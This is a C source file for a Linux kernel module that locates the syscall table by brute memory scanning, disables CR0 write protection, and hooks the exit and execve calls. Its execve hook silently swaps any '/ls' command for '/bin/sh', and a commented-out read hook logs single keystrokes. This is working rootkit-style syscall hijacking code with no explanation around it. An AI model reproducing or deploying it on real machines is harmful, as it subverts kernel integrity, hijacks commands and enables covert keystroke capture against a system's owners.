#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/string.h>

MODULE_LICENSE("Dual BSD/GPL");

//base code layout ripped from https://bbs.archlinux.org/viewtopic.php?id=139406
//reference http://lxr.free-electrons.com/source/include/

unsigned long **sys_call_table;

//asmlinkage long (*ref_sys_open)(const char __user *filename, int flags, umode_t mode);
//asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
//asmlinkage long (*ref_sys_write)(unsigned int fd, const char __user *buf, size_t count);
asmlinkage long (*ref_sys_execve)(const char __user * filename, const char __user **argv, const char __user **envp);
asmlinkage long (*ref_sys_exit)(int exitcode);

asmlinkage long new_sys_exit(int exitcode)
{
    printk("<1> my sys exit was called!!!");
    return ref_sys_exit(exitcode);
}

asmlinkage long new_sys_execve(const char __user *filename, const char __user **argv, const char __user **envp)
{
    char *last = strrchr(filename, '/');

    if(strncmp("/ls", last, 3) == 0)
    {
        memset((void*)filename, '\0', strlen(filename));
        strncat((char*)filename, "/bin/sh\0", 8);
    }
    return ref_sys_execve(filename, argv, envp);
}

/*
asmlinkage long new_sys_open(const char __user *filename, int flags, umode_t mode)
{
    return ref_sys_open(filename, flags, mode);
}

asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    long ret;
    ret = ref_sys_read(fd, buf, count);

    if(count == 1 && fd == 0)
        printk(KERN_INFO "intercept: 0x%02X", buf[0]);

    return ret;
}

asmlinkage long new_sys_write(unsigned int fd, const char __user *buf, size_t count)
{
    return ref_sys_write(fd, buf, count);
}
*/

static unsigned long **aquire_sys_call_table(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    while (offset < ULLONG_MAX) {
        sct = (unsigned long **)offset;

        if (sct[__NR_close] == (unsigned long *) sys_close) 
            return sct;

        offset += sizeof(void *);
    }

    return NULL;
}

static void disable_page_protection(void) 
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if(!(value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
}

static void enable_page_protection(void) 
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if((value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
}

static int __init bashmod_start(void) 
{
    if(!(sys_call_table = aquire_sys_call_table()))
        return -1;

    disable_page_protection();
    /*
    ref_sys_open = (void *)sys_call_table[__NR_open];
    ref_sys_read = (void *)sys_call_table[__NR_read];
    ref_sys_write = (void *)sys_call_table[__NR_write];
    */
    ref_sys_exit = (void *)sys_call_table[__NR_exit];
    ref_sys_execve = (void *)sys_call_table[__NR_execve];
    /*
    sys_call_table[__NR_open] = (unsigned long *)new_sys_open;
    sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
    sys_call_table[__NR_write] = (unsigned long *)new_sys_write;
    */
    sys_call_table[__NR_exit] = (unsigned long *)new_sys_exit;
    sys_call_table[__NR_execve] = (unsigned long *)new_sys_execve;
    enable_page_protection();

    return 0;
}

static void __exit bashmod_end(void) 
{
    if(!sys_call_table)
        return;

    disable_page_protection();
    /*
    sys_call_table[__NR_open] = (unsigned long *)ref_sys_open;
    sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
    sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
    */
    sys_call_table[__NR_exit] = (unsigned long *)ref_sys_exit;
    sys_call_table[__NR_execve] = (unsigned long *)ref_sys_execve;
    enable_page_protection();
}

module_init(bashmod_start);
module_exit(bashmod_end);
